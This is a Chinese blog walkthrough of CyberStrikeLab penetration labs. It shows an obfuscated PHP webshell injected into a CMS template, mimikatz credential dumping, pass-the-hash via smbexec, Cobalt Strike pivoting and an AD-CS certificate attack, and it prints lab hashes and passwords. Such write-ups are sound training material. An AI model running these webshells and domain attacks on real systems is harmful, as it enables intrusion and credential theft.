Wk6aGdt+g9NvIuVVEmdS76NQrjqWPj3HsCI3agyW126/mHTZfy4xXz2RnILfP6Mih4lir+dwuVLHX3tZ8VJaWP5t/nY/YNCuexU0/EqVAp1R41GrNW6X5egn8Gjf8nAutflPeN4E2ghp1+ZFbld9+UobkQFDwz4Ui7IYrcdHT7KzMc+0gjwYvQ8cTXqeZSNiMqFSSjxgcy6RaH50ux0bvI4OTChYC+Gy09DlJa/eDdlRJnQUzvUmfOFNS+j0fYKJU1pEzpWyOg1KfswIV/HrdiIMHy3RbWMPVXOxm8X68KAcXDWGr6ZRWF8aPwZyBq2+A+ywvrm1fxlRmqQzMsuQbJfz74Q4UbP8zFTKOm4wM4UneM9dql3wFvo4HzMIHwoAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagKzApoAMCARKhIgQgZU5WAuB9lbQbnvTC4WUqY+evGwY0us+DwOp2cOV2xs6hFBsSQ1lCRVJTVFJJS0VMQUIuQ09NohAwDqADAgEBoQcwBRsDREMkowcDBQBgoQAApREYDzIwMjYwMTIzMjIyMzI1WqYRGA8yMDI2MDEyNDA4MjMyNFqnERgPMjAyNjAxMzAyMjIzMjRaqBQbEkNZQkVSU1RSSUtFTEFCLkNPTaknMCWgAwIBAqEeMBwbBmtyYnRndBsSQ1lCRVJTVFJJS0VMQUIuQ09N
</span></span></code></pre></td></tr></table>
</div>
</div><p>还以为打完了，结果给崩了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124165836693.png"
	width="1220"
	height="527"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124165836693_hu12600831879783959390.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124165836693_hu9468401538301184173.png 1024w"
	loading="lazy"
	
		alt="image-20260124165836693"
	
	
		class="gallery-image" 
		data-flex-grow="231"
		data-flex-basis="555px"
	
></p>
<p>后来才发现命令中间有空格</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124170554474.png"
	width="550"
	height="278"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124170554474_hu4381816365105550776.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124170554474_hu5477604839274401249.png 1024w"
	loading="lazy"
	
		alt="image-20260124170554474"
	
	
		class="gallery-image" 
		data-flex-grow="197"
		data-flex-basis="474px"
	
></p>
<p>然后<code>mimikatz</code>抓哈希打<code>PTH</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Administrator\Desktop\mimikatz.exe &#34;lsadump::dcsync /domain:cyberstrikelab.com /user:cyberstrikelab\Administrator&#34; &#34;exit&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124171337455.png"
	width="878"
	height="396"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124171337455_hu11683135948375981556.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124171337455_hu4600866341617579232.png 1024w"
	loading="lazy"
	
		alt="image-20260124171337455"
	
	
		class="gallery-image" 
		data-flex-grow="221"
		data-flex-basis="532px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">9d880175be3fc0e75ebb9686f482cfa5
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 python3 smbexec.py -hashes :9d880175be3fc0e75ebb9686f482cfa5 cyberstrikelab.com/administrator@10.5.5.66
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124172258688.png"
	width="1062"
	height="325"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124172258688_hu10065792585253722065.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260124172258688_hu7187896696434387116.png 1024w"
	loading="lazy"
	
		alt="image-20260124172258688"
	
	
		class="gallery-image" 
		data-flex-grow="326"
		data-flex-basis="784px"
	
></p>
<h3 id="总结-1">总结
</h3><p>真的是很蠢，本来就差一个提权，镜像劫持一下就有了，一直以为一定要CS才能打约束性委派。不过也搞了一下CS，算是不错的经历</p>
<p>其实要看是不是约束性委派的话可以用之前的血猎犬，还有一个<code>powershow.ps1</code>一直没用过了</p>
<p>免杀的话，我发现用<code>powershell command</code>在拿到shell之后上线CS很方便啊，根本不用考虑免杀的问题</p>
<p>也是因为<code>lab8</code>开始有点质量了，所以写了一个总结</p>
<h2 id="lab9">lab9
</h2><h3 id="flag1-8">flag1
</h3><h4 id="知识点cmseasy历史漏洞">知识点：<code>CMSeasy</code>历史漏洞
</h4><p><code>CMSeasy</code>的站点，依旧搜索<code>nday</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125131318913.png"
	width="722"
	height="251"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125131318913_hu2575105389297906854.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125131318913_hu1105073681417725725.png 1024w"
	loading="lazy"
	
		alt="image-20260125131318913"
	
	
		class="gallery-image" 
		data-flex-grow="287"
		data-flex-basis="690px"
	
></p>
<p>依旧弱口令<code>admin/admin123456</code>（这里好像有个sql注入，可以把密码注出来）</p>
<p>登录后在模板处可以修改添加php代码</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132418440.png"
	width="1303"
	height="586"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132418440_hu14683182647033391916.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132418440_hu9619902130876225949.png 1024w"
	loading="lazy"
	
		alt="image-20260125132418440"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="533px"
	
></p>
<p>可以执行命令</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132431231.png"
	width="1027"
	height="1022"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132431231_hu7159310022112758732.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132431231_hu5016093670452003195.png 1024w"
	loading="lazy"
	
		alt="image-20260125132431231"
	
	
		class="gallery-image" 
		data-flex-grow="100"
		data-flex-basis="241px"
	
></p>
<p>但是蚁剑连不上？？</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132547247.png"
	width="1100"
	height="652"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132547247_hu4059266042516120760.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132547247_hu14180988431161655959.png 1024w"
	loading="lazy"
	
		alt="image-20260125132547247"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="404px"
	
></p>
<p>用<code>webshell</code>生成器生成一个蚁剑<code>base64</code>连接的<code>webshell</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132903056.png"
	width="1232"
	height="730"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132903056_hu11212389755336473700.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125132903056_hu16761755698394634749.png 1024w"
	loading="lazy"
	
		alt="image-20260125132903056"
	
	
		class="gallery-image" 
		data-flex-grow="168"
		data-flex-basis="405px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span> 
</span></span><span class="line"><span class="cl"><span class="k">class</span>  <span class="n">G1sO9FH7</span><span class="p">{</span><span class="o">/*</span><span class="n">F85p03</span><span class="o">*/</span><span class="n">function</span> <span class="n">__construct</span><span class="p">(</span><span class="o">$</span><span class="n">x</span><span class="p">){</span><span class="o">$</span><span class="n">c</span><span class="o">=</span><span class="n">str_rot13</span><span class="p">(</span><span class="s1">&#39;ffreg&#39;</span><span class="p">);</span><span class="o">/*</span><span class="n">F85p03</span><span class="o">*/$</span><span class="n">a</span><span class="o">=</span> <span class="p">(</span><span class="s2">&#34;!&#34;</span><span class="o">^</span><span class="s2">&#34;@&#34;</span><span class="p">)</span><span class="o">.$</span><span class="n">c</span><span class="p">;</span><span class="o">/*</span><span class="n">F85p03</span><span class="o">*/$</span><span class="n">a</span><span class="p">(</span><span class="o">$</span><span class="n">x</span><span class="p">);}}</span><span class="n">new</span>  <span class="n">G1sO9FH7</span><span class="p">(</span><span class="o">$</span><span class="n">_REQUEST</span><span class="p">[</span><span class="s1">&#39;1&#39;</span><span class="p">]);</span> 
</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">这里写进模板里一定要按照这个格式用回车分开</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125133053981.png"
	width="1170"
	height="786"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125133053981_hu7824950771666201071.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125133053981_hu690092392130188658.png 1024w"
	loading="lazy"
	
		alt="image-20260125133053981"
	
	
		class="gallery-image" 
		data-flex-grow="148"
		data-flex-basis="357px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125133321062.png"
	width="697"
	height="272"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125133321062_hu11361788291377820985.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125133321062_hu17511304011058247736.png 1024w"
	loading="lazy"
	
		alt="image-20260125133321062"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="615px"
	
></p>
<h3 id="flag2-7">flag2
</h3><h4 id="知识点smb弱口令">知识点：smb弱口令
</h4><p>蚁剑直接上传文件失败了，可能是这种直接在模板里改的后门文件会有些上传文件的限制</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tasklist /svc
</span></span></code></pre></td></tr></table>
</div>
</div><p>查看一下有没有杀毒软件，没有的话可以上线CS了</p>
<p>（有杀毒软件也可以用上面的<code>powershell command</code>上线）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125134345475.png"
	width="1947"
	height="579"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125134345475_hu16825898231217222168.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125134345475_hu2534084718313805860.png 1024w"
	loading="lazy"
	
		alt="image-20260125134345475"
	
	
		class="gallery-image" 
		data-flex-grow="336"
		data-flex-basis="807px"
	
></p>
<p>查看提权</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami /priv
</span></span></code></pre></td></tr></table>
</div>
</div><p>依旧可以用甜土豆提权</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125134416852.png"
	width="711"
	height="300"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125134416852_hu573625476847357438.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125134416852_hu6225641417965543891.png 1024w"
	loading="lazy"
	
		alt="image-20260125134416852"
	
	
		class="gallery-image" 
		data-flex-grow="237"
		data-flex-basis="568px"
	
></p>
<p>用插件一键提权</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125134526703.png"
	width="654"
	height="619"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125134526703_hu11846856704867847559.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125134526703_hu13951583568041545144.png 1024w"
	loading="lazy"
	
		alt="image-20260125134526703"
	
	
		class="gallery-image" 
		data-flex-grow="105"
		data-flex-basis="253px"
	
></p>
<p>然后建立一下<code>stowaway</code>的连接吧</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125135133931.png"
	width="1126"
	height="585"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125135133931_hu5342054273045220477.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125135133931_hu5611025571561331531.png 1024w"
	loading="lazy"
	
		alt="image-20260125135133931"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="461px"
	
></p>
<p><code>fscan</code>一下内网（<code>fscan</code>这块还是得在<code>stowaway</code>里运行）</p>
<p>扫出来</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125183448608.png"
	width="1694"
	height="720"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125183448608_hu12638775585861478874.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125183448608_hu14958884527184029153.png 1024w"
	loading="lazy"
	
		alt="image-20260125183448608"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="564px"
	
></p>
<div class="table-wrapper"><table>
<thead>
<tr>
<th>ip</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>10.6.6.10</td>
<td>外网机（已拿下）</td>
</tr>
<tr>
<td>10.6.6.88</td>
<td>存在smb弱口令</td>
</tr>
<tr>
<td>10.6.6.55</td>
<td>DC域控</td>
</tr>
</tbody>
</table></div>
<p>很明显，我们要<code>smb</code>连接上<code>88</code>这个机子</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains -q python3 smbexec.py administrator:&#39;qwe123!@#&#39;@10.6.6.88
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接用smbexec连上smb</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125185442549.png"
	width="880"
	height="192"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125185442549_hu13225771582046784140.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125185442549_hu2970835271896050391.png 1024w"
	loading="lazy"
	
		alt="image-20260125185442549"
	
	
		class="gallery-image" 
		data-flex-grow="458"
		data-flex-basis="1100px"
	
></p>
<h3 id="flag3-6">flag3
</h3><h4 id="知识点ad-cs">知识点：AD-CS
</h4><p>然后上线<code>CS</code></p>
<p>把转发上线的exe传到入口机的phpstudy里</p>
<p>尝试了几次之后发现了一个问题，我外网上线的这个靶机外网写的是我虚拟机的ip，内网写的是真正的外网地址，这就导致我转发上线的靶机如果无法访问到外网地址，那么就无法进行上线</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125191641282.png"
	width="895"
	height="125"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125191641282_hu10396330874141259923.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125191641282_hu3302835751939908274.png 1024w"
	loading="lazy"
	
		alt="image-20260125191641282"
	
	
		class="gallery-image" 
		data-flex-grow="716"
		data-flex-basis="1718px"
	
></p>
<p>但是这也难不倒我，我们可以用CS的正向连接上线，选用这个监听器，让<code>88</code>监听自己的端口</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125192656843.png"
	width="1071"
	height="503"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125192656843_hu10171306196818614235.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125192656843_hu8802265314470645708.png 1024w"
	loading="lazy"
	
		alt="image-20260125192656843"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="511px"
	
></p>
<p>然后在跳板机的<code>beacon</code>处运行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">connect 10.6.6.88
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后就能成功上线了<img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125192815621.png"
	width="592"
	height="140"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125192815621_hu8499908883742753953.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125192815621_hu10118124514621524809.png 1024w"
	loading="lazy"
	
		alt="image-20260125192815621"
	
	
		class="gallery-image" 
		data-flex-grow="422"
		data-flex-basis="1014px"
	
></p>
<p>然后域控这里是可以打<code>AD-CS</code>，wp说是用<code>fsacn</code>扫出来的，但是我没有扫出来</p>
<p>上线后上传<code>mimikatz</code>抓取一波哈希</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Public\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; &#34;exit&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">* Username : Administrator
</span></span><span class="line"><span class="cl">* Domain   : CYBERWEB
</span></span><span class="line"><span class="cl">* NTLM     : c377ba8a4dd52401bc404dbe49771bbc
</span></span><span class="line"><span class="cl">* SHA1     : d9ac14100bf4e36f6807dd3c29051983b2d58d3d
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* Username : cslab
</span></span><span class="line"><span class="cl">* Domain   : CYBERSTRIKELAB
</span></span><span class="line"><span class="cl">* NTLM     : 39b0e84f13872f51efb3b8ba5018c517
</span></span><span class="line"><span class="cl">* SHA1     : fa6a465532224cc4f1fa5094424bf219d25b7463
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">* Username : CYBERWEB$
</span></span><span class="line"><span class="cl">* Domain   : CYBERSTRIKELAB
</span></span><span class="line"><span class="cl">* NTLM     : 331dcbb88d1a4847c97eab7c1c168ac8
</span></span><span class="line"><span class="cl">* SHA1     : 0a4c17b8f051223716e86c36f1dec902e266c773
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后还需要一个域控的名字</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sehll CertUtil
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125195524713.png"
	width="945"
	height="767"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125195524713_hu4986756619774286638.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125195524713_hu4610032220310291113.png 1024w"
	loading="lazy"
	
		alt="image-20260125195524713"
	
	
		class="gallery-image" 
		data-flex-grow="123"
		data-flex-basis="295px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cyberstrikelab-DC-CA
</span></span></code></pre></td></tr></table>
</div>
</div><p>先用<code>certipy-ad</code>检测一下是否有该漏洞（kali自带）</p>
<p>很尴尬的是，这个功能需要有明文密码才能用，只能先创建新用户（这里就写在前面了）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 certipy-ad find -u liernian$ -password 7dBal4oZg05aoqNn -dc-ip 10.6.6.55 -vulnerable -stdout
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125203021216.png"
	width="1424"
	height="480"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125203021216_hu6786856369799779582.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125203021216_hu3977230538269624324.png 1024w"
	loading="lazy"
	
		alt="image-20260125203021216"
	
	
		class="gallery-image" 
		data-flex-grow="296"
		data-flex-basis="712px"
	
></p>
<p>然后AD-CS攻击需要明文密码，我们无法获得，所以就创建新用户</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains -q certipy-ad account create -u CYBERWEB$ -hashes 7b18239f2c9b611274f4a5987b8dbd04  -dc-ip 10.6.6.55 -user liernian -dns DC.cyberstrikelab.com -debug
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125201630061.png"
	width="998"
	height="394"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125201630061_hu5158905585588680060.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125201630061_hu11166322507635898215.png 1024w"
	loading="lazy"
	
		alt="image-20260125201630061"
	
	
		class="gallery-image" 
		data-flex-grow="253"
		data-flex-basis="607px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">liernian$/7dBal4oZg05aoqNn
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">liernian$/f0NBERFGL0vS8Def
</span></span></code></pre></td></tr></table>
</div>
</div><p>用创建好的账号申请一个证书（要加timeout 30，不然容易卡出去）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains -q certipy-ad req -u &#39;liernian$@cyberstrikelab.com&#39; -p &#39;7dBal4oZg05aoqNn&#39; -ca &#39;cyberstrikelab-DC-CA&#39; -target 10.6.6.55 -template &#39;Machine&#39; -debug -dc-ip 10.6.6.55 -timeout 30
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125202652831.png"
	width="873"
	height="352"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125202652831_hu5773014174693020938.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260125202652831_hu10136633508960437825.png 1024w"
	loading="lazy"
	
		alt="image-20260125202652831"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="595px"
	
></p>
<p>有了之后就可以获取域管理员哈希了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains -q certipy-ad auth -pfx dc.pfx -dc-ip 10.6.6.55 -debug
</span></span></code></pre></td></tr></table>
</div>
</div><p>好像出了点问题，说是时钟偏差过大</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126113243462.png"
	width="1191"
	height="198"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126113243462_hu5884508702595149303.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126113243462_hu982891865047175120.png 1024w"
	loading="lazy"
	
		alt="image-20260126113243462"
	
	
		class="gallery-image" 
		data-flex-grow="601"
		data-flex-basis="1443px"
	
></p>
<p>搞了很久，甚至把工具升级之后还是没有</p>
<p>这个报错有人用<code>faketime</code>成功了，但是我的还是成功不了。</p>
<p>这里就不再多花时间了，最后就是打个<code>PTH</code>直接用别人打出来的哈希打了</p>
<h2 id="lab14">lab14
</h2><h3 id="flag1-9">flag1
</h3><h4 id="知识点pluck-cms历史漏洞">知识点：Pluck CMS历史漏洞
</h4><p>Pluck CMS，直接打nday</p>
<p>弱口令<code>cslab</code></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260206185028346.png"
	width="589"
	height="509"
